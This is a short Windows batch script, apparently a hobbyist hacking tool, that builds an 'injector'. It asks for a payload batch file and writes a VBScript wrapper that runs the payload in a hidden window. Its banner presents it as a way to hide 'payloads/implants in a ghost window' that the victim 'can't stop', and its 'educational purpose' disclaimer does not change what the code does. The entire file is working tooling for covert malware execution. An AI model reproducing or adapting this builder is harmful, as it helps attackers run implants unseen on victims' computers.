@echo OFF
title 
echo.
echo   _,~-'
echo     \ \
echo      \ \  ,
echo      _,~-'\
echo     '\     \
echo       \     \
echo        \     \
echo         \_010'\
echo          \_010'\
echo           \_110'\
echo            \_100-'
echo                \
echo                 \
echo                  \
echo                   \
echo                    \
echo.
echo "From an exe you won't doubt, will prompt a script you can't stop."
echo.
echo basic batch script to wrap your payloads/implants in a ghost window.
echo by CrashLog, For Educational Purpose Only.
echo.
echo Ryujin is evil.
echo.
pause
cls

:BEGIN
set /p inject="Name your Injector : "
cls
set /p file="Where's your BAT  ? (don't forget the extension) " 
cls

echo.
echo.
echo Injector name : %inject%
echo.
echo Payload : %file%
echo.
echo.

set /P c=Are you sure you want to continue[Y/N]?
if /I "%c%" EQU "Y" goto :BUILD
if /I "%c%" EQU "N" goto :BEGIN

:BUILD
cls
echo Set WshShell = CreateObject("WScript.Shell") > %inject%.vbs
echo WshShell.Run chr(34) + "%file%" + Chr(34), 0 >> %inject%.vbs
echo Set WshShell = Nothing >> %inject%.vbs
echo.
echo.
echo %inject% injector made from %file% is ready to use
echo.
echo injector stored in : %cd%

pause